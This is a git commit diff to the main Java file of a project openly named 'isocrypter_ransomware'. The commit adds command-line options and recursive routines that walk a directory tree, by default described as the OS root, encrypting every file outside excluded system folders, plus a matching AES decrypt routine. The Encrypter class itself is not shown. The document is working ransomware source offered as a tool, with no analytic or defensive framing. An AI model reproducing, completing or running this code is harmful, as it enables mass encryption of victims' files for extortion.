419a476d957a8a8f234b9e478e38c90e23883cd2
ISO53 <102249575+ISO53@users.noreply.github.com>
2023-12-04 21:54:58 +0300

    update app.java

--- isocrypter_ransomware/src/main/java/com/iso53/App.java
+++ isocrypter_ransomware/src/main/java/com/iso53/App.java
@@ -2,7 +2,13 @@ package com.iso53;
 
 import org.apache.commons.cli.*;
 
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.HashSet;
 
 class App {
@@ -11,15 +17,12 @@ class App {
     private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
 
     public static void main(String[] args) {
-
-        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";
+        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial\\Fullstack-Auction-Website";
         CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
 
         Options options = new Options();
         initOptions(options);
         parseOptions(options, args);
-
-        traverseAndEncrypt(new File(PATH).listFiles());
     }
 
     public static void traverseAndEncrypt(File[] files) {
@@ -30,8 +33,26 @@ class App {
         for (File file : files) {
             if (file.isDirectory()) {
                 if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
-                    // System.out.println("Directory: " + file.getAbsolutePath());
                     traverseAndEncrypt(file.listFiles());
+                }
+            } else {
+                System.out.println("File: " + file.getAbsolutePath());
+                Encrypter encrypter = new Encrypter(file.toPath(), Encrypter.FILE);
+                encrypter.run();
+            }
+        }
+    }
+
+    public static void traverseAndDecrypt(File[] files, SecretKey key) {
+        if (files == null) {
+            return;
+        }
+
+        for (File file : files) {
+            if (file.isDirectory()) {
+                if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
+                    // System.out.println("Directory: " + file.getAbsolutePath());
+                    traverseAndDecrypt(file.listFiles(), key);
                 }
             } else {
                 // System.out.println("File: " + file.getAbsolutePath());
@@ -41,6 +62,13 @@ class App {
 
     private static void initOptions(Options options) {
         options.addOption("h", "help", false, "Prints help message.");
+        options.addOption(Option
+                .builder("p")
+                .longOpt("path")
+                .desc("Specify the path the program should run. Default is the root path of the OS.")
+                .hasArg()
+                .argName("path")
+                .build());
         options.addOption("e", "encrypt", false, "Encrypts all the files in the specified path.");
         options.addOption(Option
                 .builder("d")
@@ -48,13 +76,6 @@ class App {
                 .desc("Decrypts all the files in the specified path.")
                 .hasArg()
                 .argName("key")
-                .build());
-        options.addOption(Option
-                .builder("p")
-                .longOpt("path")
-                .desc("Specify the path the program should run. Default is the root path of the OS.")
-                .hasArg()
-                .argName("path")
                 .build());
     }
 
@@ -66,16 +87,41 @@ class App {
 
             if (cmd.hasOption("help")) {
                 HelpFormatter helpFormatter = new HelpFormatter();
-                helpFormatter.printHelp("IsoCrypter-Ransomware", options);
+                helpFormatter.printHelp("IsoCrypter", options);
+                return;
+            }
+
+            if (cmd.hasOption("path")) {
+                String inputStringPath = cmd.getOptionValue("path");
+                Path inputPath = Paths.get(inputStringPath);
+
+                if (!Files.exists(inputPath)) {
+                    System.out.println("This path is invalid.");
+                    return;
+                }
+
+                if (!Files.isDirectory(inputPath)) {
+                    System.out.println("This path is not a directory.");
+                    return;
+                }
+
+                PATH = inputStringPath;
             }
 
             if (cmd.hasOption("decrypt")) {
-                String key = cmd.getOptionValue("decrypt");
-                // traverseAndEncrypt();
+                String stringKey = cmd.getOptionValue("decrypt");
+                SecretKey key = new SecretKeySpec(stringKey.getBytes(StandardCharsets.UTF_8), "AES");
+                traverseAndDecrypt(new File(PATH).listFiles(), key);
+                return;
             }
+
+            if (cmd.hasOption("encrypt")) {
+                traverseAndEncrypt(new File(PATH).listFiles());
+            }
+        } catch (MissingArgumentException e) {
+            System.out.println("Missing argument.");
         } catch (ParseException e) {
-            e.printStackTrace();
+            System.out.println("Parsing error.");
         }
     }
-
 }
